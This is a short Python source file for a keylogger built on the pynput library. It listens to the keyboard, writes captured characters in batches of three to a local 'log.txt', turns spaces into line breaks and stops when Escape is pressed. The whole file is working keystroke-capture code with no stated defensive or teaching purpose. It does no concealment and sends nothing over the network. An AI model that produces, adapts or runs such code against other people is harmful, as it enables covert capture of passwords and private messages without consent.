import os
from pynput.keyboard import Key, Listener

count = 0
keys = []
device = "log"
file_name = device+".txt"

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 3:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
   if os.path.exists(file_name):
       with open(file_name, "a") as file:
           for key in keys:
               k = str(key).replace("'","")
               if k.find("space") > 0:
                   file.write("\n")
               elif k.find("Key") == -1:
                   file.write(k)

   else:
       open(file_name, "w+")

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

